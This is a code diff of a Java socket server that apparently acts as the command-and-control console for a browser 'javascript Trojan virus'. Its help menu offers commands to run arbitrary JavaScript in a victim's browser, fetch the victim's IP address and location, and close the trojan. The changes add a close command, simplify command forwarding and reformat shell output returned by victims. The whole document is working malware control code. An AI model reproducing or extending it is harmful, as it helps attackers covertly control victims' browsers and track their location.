@@ -28,7 +28,8 @@ public class SocketServer {
                         System.out.println(" |-Help-|\n" +
                                 " 1. jsconsole                      Run javascript on control browser.\n" +
                                 " 2. getip                          Get Controlled-end's IP address.\n" +
-                                " 3. getlocation                    Get Controlled-end's location information.");
+                                " 3. getlocation                    Get Controlled-end's location information.\n" +
+                                " 4. close                          Close the Controlled-end's javascript Trojan virus.");
                         continue;
                     }
                     if (command.equals("jsconsole")) {
@@ -47,12 +48,6 @@ public class SocketServer {
                             SocketServer.sendCommand = "js: "+javascript;
                         }
                         continue;
-                    }
-                    if (command.equals("getip")) {
-                        SocketServer.sendCommand = "getip";
-                    }
-                    if (command.equals("getlocation")) {
-                        SocketServer.sendCommand = "getlocation";
                     }
                     else {
                         SocketServer.sendCommand = command;
@@ -93,8 +88,12 @@ public class SocketServer {
                                 socket.close();
                             }
                             if (url.startsWith("/?=shell_return")) {
+                                System.out.println("\n");
+                                String[] split = url.substring(url.indexOf(" ")+1).split("/n");
+                                for (String i : split) {
+                                    System.out.println(" "+i);
+                                }
                                 System.out.println();
-                                System.out.println(url.substring(url.indexOf(" ")+1));
                                 System.out.print(SocketServer.terminal);
                                 printWriter.println("HTTP/1.1 200 OK");
                                 printWriter.println("Content-Type: text/plain");
